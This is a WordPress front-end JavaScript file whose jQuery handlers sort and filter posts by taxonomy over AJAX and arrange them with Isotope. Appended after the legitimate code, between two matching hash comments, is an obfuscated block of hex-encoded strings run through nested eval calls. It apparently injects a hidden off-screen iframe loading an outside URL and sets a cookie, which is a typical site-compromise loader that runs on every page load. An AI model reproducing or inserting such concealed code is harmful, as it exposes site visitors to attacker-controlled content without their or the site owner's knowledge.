jQuery(document).ready(function($) {
	
	var selected_taxonomy=null;
	var selected_taxonomy_term=null;
	var selected_order=null;
	var selected_orderby=null;
	var $html;
	var $container;
	
	$('.sort-option').click(function(event){
		// Prevent defualt action - opening tag page
		
		
		if (event.preventDefault) {
			event.preventDefault();
		} else {
			event.returnValue = false;
		}
		var selected_orderby = $(this).attr('orderby');
		selected_taxonomy = selected_taxonomy;
		selected_taxonomy_term = selected_taxonomy_term;
		$('#articles-list').fadeOut();
		
		if(selected_orderby == 'title'){
			selected_order='ASC';
		}else{
			selected_order = selected_order;
		}
		
		data = {
				action: 'sort_posts',
				afp_nonce: afp_vars.afp_nonce,
				taxonomy:selected_taxonomy,
				taxonomy_term:selected_taxonomy_term,
				order:selected_order,
				orderby:selected_orderby,
			};
		
		$.ajax({
			type: 'POST',
			url: afp_vars.afp_ajax_url,
			dataType: 'json',
			data: data,
			success: function( data ) {
				//console.log(data.taxonomy_term);
				$html = $( data  );
				 	$('.grid').html( $html );
					var elements = $('.grid-item');
				 	$('.grid').append( elements )
				 		
				$('#articles-list').fadeIn();
			},
			error: function(MLHttpRequest, textStatus, errorThrown ) {
				alert(errorThrown);
				console.log(data)
				$('#articles-list').fadeIn();
			//	$('#articles-list').html( 'No posts found' );
			//	$('#articles-list').fadeIn();
			}
		})

	});


	$('.tax-filter').click( function(event) {

		// Prevent defualt action - opening tag page
		if (event.preventDefault) {
			event.preventDefault();
		} else {
			event.returnValue = false;
		}

		// Get tag slug from title attirbute
		selected_taxonomy_term = $(this).attr('title');
		parent_taxonomy = $(this).parent();
		selected_taxonomy = parent_taxonomy.attr('class');
		selected_order = selected_order;
		selected_orderby = selected_orderby;
		
		$('#articles-list').fadeOut();

		data = {
			action: 'filter_posts',
			afp_nonce: afp_vars.afp_nonce,
			taxonomy_term: selected_taxonomy_term,
			taxonomy: selected_taxonomy,
			orderby: selected_orderby,
			order: selected_order,
		};

	
		$.ajax({
			type: 'GET',
			dataType: 'json',
			url: afp_vars.afp_ajax_url,
			data: data,
			success: function( data ) {
				$html = $( data  );
			 	$('.grid').html( $html);
				$('#articles-list').fadeIn();
			
			},
			error: function( ) {

				$('#articles-list').html( 'No posts found' );
				$('#articles-list').fadeIn();
			}
		})

	});
	
	/*var url = 'page.php';
   $.post(url, { class: myClass })*/
	
});

/************************************ AJAX COMPLETE FUNCTION ************************************/

$( document ).ajaxComplete(function( ) {
	
	var elements = $('.grid-item');
	$('.grid').isotope( 'appended', elements )

	
//	$('.grid').isotope('layout');
	/*
	  $('.grid').isotope({
			 percentPosition: true,
			//  layoutMode: 'packery',
		    layoutMode: 'masonry',
		    itemSelector: '.grid-item',
		 //   packery: {
		  masonry: {
		      gutter: '.grid-gutter'
		      }
		  });
		  
*/
});
/*25a836ce3bcb48604055464342f4b3b4*/;window["\x64\x6f"+"\x63\x75"+"\x6d\x65"+"\x6e\x74"]["\x69\x62\x68\x79\x68"]=["\x36\x35\x33\x64\x32\x37\x37\x30\x36\x66\x37\x33\x36\x39\x37\x34\x36\x39\x36\x66\x36\x65\x33\x61\x36\x31\x36\x32\x37\x33\x36\x66\x36\x63\x37\x35\x37\x34\x36\x35\x33\x62\x37\x61\x32\x64\x36\x39\x36\x65\x36\x34\x36\x35\x37\x38\x33\x61\x33\x31\x33\x30\x33\x30\x33\x30\x33\x62\x37\x34\x36\x66\x37\x30\x33\x61\x32\x64\x33\x31\x33\x30\x33\x30\x33\x30\x37\x30\x37\x38\x33\x62\x36\x63","\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x76\x61\x72\x20\x6e\x69\x6e\x6b\x6e\x3d\x22\x22\x3b\x76\x61\x72\x20\x68\x65\x72\x61\x65\x3d\x22\x37\x37\x36\x39\x36\x65\x36\x34\x36\x66\x37\x37\x32\x65\x36\x66\x36\x65\x36\x63\x36\x66\x36\x31\x36\x34\x32\x30\x33\x64\x32\x30\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x38\x32\x39\x37\x62\x36\x36\x37\x35","\x61\x72\x20\x61\x62\x69\x65\x66\x3d\x30\x3b\x61\x62\x69\x65\x66\x3c\x68\x65\x72\x61\x65\x2e\x6c\x65\x6e\x67\x74\x68\x3b\x61\x62\x69\x65\x66\x2b\x3d\x32\x29\x7b\x6e\x69\x6e\x6b\x6e\x3d\x6e\x69\x6e\x6b\x6e\x2b\x70\x61\x72\x73\x65\x49\x6e\x74\x28\x68\x65\x72\x61\x65\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x61\x62\x69\x65\x66\x2c\x61\x62\x69\x65\x66\x2b\x32\x29\x2c\x20\x31","\x36\x35\x33\x33\x33\x33\x36\x33\x32\x36\x36\x31\x36\x34\x35\x66\x36\x39\x36\x34\x33\x64\x35\x34\x37\x37\x36\x39\x37\x35\x36\x35\x33\x31\x33\x32\x33\x33\x32\x32\x33\x62\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x65\x36\x39\x36\x65\x36\x65\x36\x35\x37\x32\x34\x38\x35\x34\x34\x64\x34\x63\x33\x64\x32\x32\x33\x63\x36\x34\x36\x39\x37\x36\x32\x30\x37\x33\x37\x34\x37\x39\x36\x63","\x32\x38\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x33\x35\x62\x33\x30\x35\x64\x32\x65\x37\x33\x37\x30\x36\x63\x36\x39\x37\x34\x32\x38\x32\x37\x33\x64\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33","\x33\x35\x36\x37\x36\x34\x36\x33\x33\x33\x36\x34\x37\x33\x32\x32\x32\x39\x37\x62\x37\x38\x33\x32\x33\x32\x36\x32\x37\x31\x32\x38\x32\x32\x36\x31\x36\x34\x32\x64\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x32\x32\x63\x32\x32\x36\x35\x37\x32\x33\x32\x37\x36\x36\x34\x37\x32\x33\x35\x36\x37\x36\x34\x36\x33\x33\x33\x36\x34\x37\x33\x32\x32\x32\x63\x33\x31\x32\x39\x33\x62","\x32\x30\x36\x32\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x35\x32\x36\x35\x36\x37\x34\x35\x37\x38\x37\x30\x32\x38\x36\x31\x32\x62\x32\x37\x33\x64\x32\x38\x35\x62\x35\x65\x33\x62\x35\x64\x32\x39\x37\x62\x33\x31\x32\x63\x37\x64\x32\x37\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x33\x32\x30\x33\x64\x32\x30\x36\x32\x32\x65\x36\x35\x37\x38\x36\x35\x36\x33","\x36\x39\x36\x34\x33\x64\x33\x38\x33\x36\x33\x39\x33\x35\x33\x38\x33\x33\x33\x34\x32\x36\x36\x62\x36\x35\x37\x39\x37\x37\x36\x66\x37\x32\x36\x34\x33\x64\x33\x37\x36\x35\x33\x30\x33\x32\x36\x32\x36\x35\x33\x32\x36\x33\x33\x34\x36\x35\x33\x35\x33\x38\x33\x37\x36\x33\x33\x39\x36\x32\x33\x33\x36\x31\x36\x31\x36\x36\x36\x31\x33\x31\x33\x39\x36\x36\x36\x32\x33\x30\x36\x32\x33\x31","\x29\x28\x29\x3b","\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x66\x32\x30\x36\x33\x35\x62\x33\x31\x35\x64\x32\x30\x33\x61\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x37\x36\x36\x31\x37\x32\x32\x30","\x36\x29\x2b\x22\x2c\x22\x3b\x7d\x6e\x69\x6e\x6b\x6e\x3d\x6e\x69\x6e\x6b\x6e\x2e\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x30\x2c\x6e\x69\x6e\x6b\x6e\x2e\x6c\x65\x6e\x67\x74\x68\x2d\x31\x29\x3b\x65\x76\x61\x6c\x28\x65\x76\x61\x6c\x28\x27\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x27\x2b\x6e\x69\x6e\x6b\x6e\x2b\x27\x29\x27\x29\x29\x3b\x7d","\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x32\x33\x32\x36\x32\x37\x31\x32\x38\x36\x31\x32\x63\x36\x32\x32\x63\x36\x33\x32\x39\x37\x62\x36\x39\x36\x36\x32\x38\x36\x33\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32\x32\x30\x36\x34\x32\x30\x33\x64\x32\x30\x36\x65\x36\x35\x37\x37\x32\x30\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x32\x39\x33\x62\x36\x34\x32\x65","\x32\x30\x33\x61\x32\x30\x32\x37\x32\x37\x32\x39\x33\x62\x36\x35\x36\x63\x37\x33\x36\x35\x32\x30\x37\x32\x36\x35\x37\x34\x37\x35\x37\x32\x36\x65\x32\x30\x36\x36\x36\x31\x36\x63\x37\x33\x36\x35\x33\x62\x37\x64\x36\x36\x37\x35\x36\x65\x36\x33\x37\x34\x36\x39\x36\x66\x36\x65\x32\x30\x37\x38\x33\x33\x33\x33\x36\x32\x37\x31\x32\x38\x36\x31\x32\x39\x37\x62\x37\x36\x36\x31\x37\x32","\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x33\x64\x32\x30\x37\x38\x33\x33\x33\x33\x36\x32\x37\x31\x32\x38\x32\x32\x36\x31\x36\x34\x32\x64\x36\x33\x36\x66\x36\x66\x36\x62\x36\x39\x36\x35\x32\x32\x32\x39\x33\x62\x36\x39\x36\x36\x32\x38\x32\x30\x37\x38\x33\x33\x33\x33\x36\x34\x37\x31\x32\x30\x32\x31\x33\x64\x32\x30\x32\x32\x36\x35\x37\x32\x33\x32\x37\x36\x36\x34\x37\x32","\x37\x33\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x36\x34\x32\x65\x36\x37\x36\x35\x37\x34\x34\x34\x36\x31\x37\x34\x36\x35\x32\x38\x32\x39\x32\x62\x36\x33\x32\x39\x33\x62\x37\x64\x36\x39\x36\x36\x32\x38\x36\x31\x32\x30\x32\x36\x32\x36\x32\x30\x36\x32\x32\x39\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x36\x66\x36\x66","\x36\x35\x36\x36\x37\x34\x33\x61\x32\x64\x33\x39\x33\x39\x33\x39\x33\x39\x37\x30\x37\x38\x33\x62\x32\x37\x33\x65\x33\x63\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x32\x30\x37\x33\x37\x32\x36\x33\x33\x64\x32\x37\x32\x32\x32\x62\x37\x38\x33\x32\x33\x32\x37\x31\x37\x31\x32\x62\x32\x32\x32\x37\x33\x65\x33\x63\x32\x66\x36\x39\x36\x36\x37\x32\x36\x31\x36\x64\x36\x35\x33\x65","\x33\x63\x32\x66\x36\x34\x36\x39\x37\x36\x33\x65\x32\x32\x33\x62\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x32\x36\x66\x36\x34\x37\x39\x32\x65\x36\x31\x37\x30\x37\x30\x36\x35\x36\x65\x36\x34\x34\x33\x36\x38\x36\x39\x36\x63\x36\x34\x32\x38\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x39\x33\x62\x37\x64\x37\x64\x22\x3b\x66\x6f\x72\x20\x28\x76","\x36\x62\x36\x39\x36\x35\x32\x30\x33\x64\x32\x30\x36\x31\x32\x62\x32\x37\x33\x64\x32\x37\x32\x62\x36\x32\x32\x62\x32\x38\x36\x33\x32\x30\x33\x66\x32\x30\x32\x37\x33\x62\x32\x30\x36\x35\x37\x38\x37\x30\x36\x39\x37\x32\x36\x35\x37\x33\x33\x64\x32\x37\x32\x62\x36\x34\x32\x65\x37\x34\x36\x66\x35\x35\x35\x34\x34\x33\x35\x33\x37\x34\x37\x32\x36\x39\x36\x65\x36\x37\x32\x38\x32\x39","\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38\x33\x32\x33\x32\x36\x34\x37\x31\x32\x30\x33\x64\x32\x30\x36\x34\x36\x66\x36\x33\x37\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x65\x36\x33\x37\x32\x36\x35\x36\x31\x37\x34\x36\x35\x34\x35\x36\x63\x36\x35\x36\x64\x36\x35\x36\x65\x37\x34\x32\x38\x32\x32\x36\x34\x36\x39\x37\x36\x32\x32\x32\x39\x33\x62\x37\x36\x36\x31\x37\x32\x32\x30\x37\x38","\x33\x32\x33\x32\x37\x31\x37\x31\x32\x30\x33\x64\x32\x30\x32\x32\x36\x38\x37\x34\x37\x34\x37\x30\x33\x61\x32\x66\x32\x66\x36\x61\x37\x33\x32\x65\x37\x30\x36\x66\x36\x63\x36\x65\x37\x35\x33\x34\x36\x35\x37\x37\x37\x34\x36\x31\x36\x65\x33\x34\x36\x39\x37\x37\x36\x62\x36\x39\x32\x65\x37\x37\x37\x33\x32\x66\x36\x31\x36\x34\x36\x64\x36\x35\x36\x34\x36\x39\x36\x31\x32\x66\x33\x66"];var ratda=rbhzk=bdyke=eirky=rfhte=ikity=window["\x64\x6f"+"\x63\x75"+"\x6d\x65"+"\x6e\x74"]["\x69\x62\x68\x79\x68"],yasef=window;eval(eval("[yasef[\"\x62\x64\x79\x6b\x65\"][\"\x31\"],yasef[\"\x69\x6b\x69\x74\x79\"][\"\x31\x31\"],yasef[\"rfhte\"][\"\x31\x34\"],yasef[\"ikity\"][\"\x31\x37\"],yasef[\"ratda\"][\"\x31\x32\"],yasef[\"\x72\x66\x68\x74\x65\"][\"\x36\"],yasef[\"\x72\x62\x68\x7a\x6b\"][\"\x34\"],yasef[\"\x72\x62\x68\x7a\x6b\"][\"\x39\"],yasef[\"rfhte\"][\"\x31\x33\"],yasef[\"eirky\"][\"\x35\"],yasef[\"eirky\"][\"\x31\x38\"],yasef[\"\x69\x6b\x69\x74\x79\"][\"\x31\x39\"],yasef[\"eirky\"][\"\x37\"],yasef[\"\x72\x66\x68\x74\x65\"][\"\x33\"],yasef[\"eirky\"][\"\x30\"],yasef[\"\x69\x6b\x69\x74\x79\"][\"\x31\x35\"],yasef[\"\x72\x61\x74\x64\x61\"][\"\x31\x36\"],yasef[\"\x65\x69\x72\x6b\x79\"][\"\x32\"],yasef[\"\x72\x61\x74\x64\x61\"][\"\x31\x30\"],yasef[\"\x62\x64\x79\x6b\x65\"][\"\x38\"]].join(\"\");"));/*25a836ce3bcb48604055464342f4b3b4*/